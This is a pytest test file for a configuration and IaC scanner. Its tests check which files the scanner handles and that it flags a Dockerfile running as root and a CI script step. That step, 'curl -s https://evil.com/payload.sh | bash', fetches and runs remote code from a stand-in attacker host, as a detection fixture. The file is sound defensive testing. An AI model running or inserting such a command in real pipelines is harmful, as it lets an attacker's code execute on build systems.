"""Tests for the Config & IaC Scanner."""

import os
import tempfile
import pytest

from suscheck.core.finding import FindingType, Severity
from suscheck.modules.config_scanner import ConfigScanner

def test_can_handle():
    scanner = ConfigScanner()
    assert scanner.can_handle("config", "anything.txt") is True
    assert scanner.can_handle("code", "Dockerfile") is True
    assert scanner.can_handle("code", "docker-compose.yml") is True
    assert scanner.can_handle("code", "Jenkinsfile") is True
    assert scanner.can_handle("code", "app.py") is False

def test_scan_docker_root():
    content = """
FROM python:3.9
USER root
RUN apt-get update
"""
    scanner = ConfigScanner()
    with tempfile.NamedTemporaryFile(mode="w", suffix=".dockerfile", delete=False) as tf:
        tf.write(content)
        tf_path = tf.name

    try:
        # Pass the path to scan
        res = scanner.scan(tf_path)
        
        root_finding = next((f for f in res.findings if f.finding_id == "SUS-CONF-DOCKER-ROOT"), None)
        assert root_finding is not None
        assert root_finding.severity == Severity.MEDIUM
        assert root_finding.finding_type == FindingType.CONFIG_RISK
    finally:
        os.unlink(tf_path)

def test_scan_curl_bash():
    content = """
stages:
  - deploy
deploy:
  script:
    - curl -s https://evil.com/payload.sh | bash
"""
    scanner = ConfigScanner()
    with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as tf:
        tf.write(content)
        tf_path = tf.name

    try:
        res = scanner.scan(tf_path)
        
        pipe_finding = next((f for f in res.findings if f.finding_id == "SUS-CONF-CURL-BASH"), None)
        assert pipe_finding is not None
        assert pipe_finding.severity == Severity.HIGH
        assert pipe_finding.finding_type == FindingType.SUSPICIOUS_BEHAVIOR
        assert pipe_finding.evidence["matched"] == "curl -s https://evil.com/payload.sh | bash"
    finally:
        os.unlink(tf_path)
